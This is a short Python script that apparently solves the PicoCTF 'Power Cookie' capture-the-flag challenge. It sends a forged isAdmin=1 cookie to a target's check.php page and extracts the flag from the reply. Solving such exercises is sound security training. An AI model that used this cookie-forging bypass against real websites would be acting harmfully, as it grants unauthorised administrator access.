import requests

def web_solve(params):
    target_url = params.get('url')
    if not target_url: return {"success": False, "error": "URL required"}
    
    log = []
    log.append(f"[*] Targeting {target_url}...")
    
    cookies = {"isAdmin": "1"}
    log.append("[*] Injecting session cookie: isAdmin=1")
    
    try:
        # Check-flag endpoint or main page if it varies
        url = target_url.rstrip('/') + "/check.php" # Based on PicoCTF PowerCookie pattern
        res = requests.get(url, cookies=cookies)
        
        if res.status_code == 200:
            content = res.text
            if "picoCTF{" in content:
                flag = content.split("picoCTF{")[1].split("}")[0]
                flag = "picoCTF{" + flag + "}"
                log.append("[+] Flag successfully extracted!")
                return {"success": True, "flag": flag, "log": "\n".join(log)}
            else:
                log.append("[!] Page loaded but no flag found. Content length: " + str(len(content)))
                return {"success": False, "error": "Flag not found in response.", "log": "\n".join(log)}
        else:
            return {"success": False, "error": f"Server returned HTTP {res.status_code}"}
            
    except Exception as e:
        return {"success": False, "error": str(e)}
